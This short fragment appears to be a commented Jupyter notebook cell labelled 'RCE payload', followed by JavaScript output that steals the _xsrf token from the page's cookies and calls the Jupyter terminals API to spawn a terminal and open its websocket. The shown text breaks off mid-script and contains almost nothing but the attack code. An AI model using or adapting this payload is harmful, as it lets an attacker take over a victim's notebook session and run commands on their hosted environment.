# %%
# %%html
# <script>/* RCE payload */</script>
# Out:
# <script>
# function getCookie(name) {
#     var value = "; " + document.cookie;
#     var parts = value.split("; " + name + "=");
#     if (parts.length == 2) return parts.pop().split(";").shift();
#     return null;
# }
# var csrfToken = getCookie('_xsrf');
# var xhr1 = new XMLHttpRequest();
# xhr1.open('GET', 'https://' + document.domain + '/studiolab/default/jupyter/api/terminals', true);
# xhr1.send(null);
# var xhr2 = new XMLHttpRequest();
# xhr2.open('POST', 'https://' + document.domain + '/studiolab/default/jupyter/api/terminals', true);
# xhr2.setRequestHeader('Content-Type', 'application/json');
# if (csrfToken) xhr2.setRequestHeader('X-XSRFToken', csrfToken);
# xhr2.send(JSON.stringify({}));
# setTimeout(function() {
#     var xhr = new XMLHttpRequest();
#     xhr.open('GET', 'https://' + document.domain + '/studiolab/default/jupyter/terminals/websocket/1', true);
#     xhr.send(null);
# ...
